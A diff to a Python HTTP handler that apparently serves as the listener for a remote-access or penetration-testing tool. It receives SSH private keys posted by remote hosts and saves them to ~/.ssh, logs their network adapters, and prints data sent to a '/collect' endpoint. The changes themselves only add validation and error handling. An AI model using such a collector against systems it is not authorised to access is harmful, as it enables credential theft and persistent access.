@@ -35,8 +35,8 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n')
 			try:
 				post_json = json.loads(post_data.decode())
+				
 				private_key = post_json.get("PrivateKey", "")
-				adapters = post_json.get("Adapters", [])
 				if private_key:
 					private_key = self.sanitize_key(private_key)
 					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
@@ -48,14 +48,22 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 				else:
 					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No private key found in POST data\n')
 				
-				if adapters:
+				adapters = post_json.get("Adapters", [])
+				if isinstance(adapters, list):
 					for adapter in adapters:
 						interface = adapter.get("Interface", "")
 						ip_address = adapter.get("IPAddress", "")
 						if isinstance(interface, str) and isinstance(ip_address, str):
 							stdout.write(f'{Fore.BLUE}[adapter]{Style.RESET_ALL} Interface: {interface}, IP: {ip_address}\n')
+						else:
+							stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Invalid adapter data\n')
+				else:
+					stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Adapters data is not a list\n')
+					
 			except json.JSONDecodeError:
 				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
+			except Exception as e:
+				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} {str(e)}\n')
 
 		elif self.path == '/collect':
 			stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
